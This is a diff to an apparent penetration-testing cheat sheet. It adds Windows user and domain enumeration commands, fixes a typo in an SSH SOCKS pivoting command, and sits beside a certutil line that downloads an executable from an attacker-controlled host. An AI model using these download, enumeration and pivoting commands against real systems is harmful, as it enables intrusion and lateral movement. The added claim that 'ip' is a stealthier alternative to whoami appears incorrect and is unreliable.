@@ -104,6 +104,12 @@ sc query [application]
 certutil.exe -urlcache -f http://[attackerip]:8000/[application.exe] [applicationname.exe]
 
 ### Windows System Enumeration
+net user  
+net user /domain  
+net localgroup administrators  
+
+set
+
 systeminfo
 
 hostname
@@ -114,6 +120,8 @@ hostname
 (Driver enum) wmic logicaldisk get caption,description,providername  
 
 ### Windows User Enumeration
+
+ip (more stealthier compared to whoami and presents more details)
 
 whoami
 
@@ -185,8 +193,8 @@ xfreerdp - xfreerdp /u:Administrator /p:'Password' /v:10.10.10.1
 ## Pivoting  
 
 proxychains / conf files located at /etc/proxychains.conf  
-ssh tunnel throuhg 155.5, with connectioned dropped in the background.
-ssh -f -N -D 9050 -i encrypted_rsa1.key adminuser@10.10.155.5
+ssh tunnel through 155.5, with connectioned dropped in the background.  
+ssh -f -N -D 9050 -i encrypted_rsa1.key adminuser@10.10.155.5  
 
 shuttle  
 
